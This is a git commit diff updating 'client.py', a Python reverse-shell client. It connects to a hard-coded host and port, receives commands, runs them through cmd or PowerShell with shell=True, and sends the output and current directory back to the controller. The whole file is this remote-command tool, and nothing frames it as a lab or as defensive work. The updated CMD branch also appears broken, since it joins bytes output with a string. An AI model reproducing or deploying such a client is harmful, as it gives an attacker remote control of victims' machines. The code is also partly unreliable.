f6b0e63bf403883eaa7ed30ce2ee4c5ab40938df
prog-ammar <ammarofc2005@gmail.com>
2024-12-05 22:01:27 +0500

    Update client.py
    updated client.py

--- client.py
+++ client.py
@@ -3,18 +3,38 @@ import socket
 import subprocess
 
 s=socket.socket()
-host="182.183.102.228"
+host="192.168.1.67"
 port=1234
 s.connect((host,port))
+choice=s.recv(1024)
+choice=choice.decode("utf-8")
+
 
 while True:
-    data=s.recv(1024)
-    if data[:2].decode("utf-8")=="cd":
-        os.chdir(data[3:].decode("utf-8"))
-    if len(data) > 0:
-        cmd=subprocess.Popen(data.decode("utf-8"),shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        output=cmd.stdout.read()+cmd.stderr.read()
-        output=str(output,"utf-8")
-        string3=str.encode(output)
-        s.send(string3)
+   try:
+     data=s.recv(10000024)
+     if len(data) > 0:
+        
+        if choice=="CMD":
+           if data[:2].decode("utf-8")=="cd":
+                os.chdir(data[3:].decode("utf-8"))
+                s.sendall(str.encode("\n"+os.getcwd()+'>',"utf-8"))
+           else:    
+                cmd=subprocess.Popen(data.decode("utf-8"),shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                output=cmd.stdout.read()+cmd.stderr.read()
+                string3=str.encode(output+os.getcwd()+'>',"utf-8")
+                s.sendall(string3)
+           
+        elif choice=="PS":
+           if data[:2].decode("utf-8")=="cd":
+                os.chdir(data[3:].decode("utf-8"))
+                s.sendall(str.encode("\n"+os.getcwd()+'>',"utf-8"))
+           else:
+               p=subprocess.Popen(["powershell","-Command",data.decode("utf-8")],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True,shell=True)
+               output=p.stdout.read()+p.stderr.read()
+               string3=str.encode(output+os.getcwd()+'>',"utf-8")
+               s.sendall(string3)
+   except KeyboardInterrupt:
+        s.close()
+        break
 s.close()
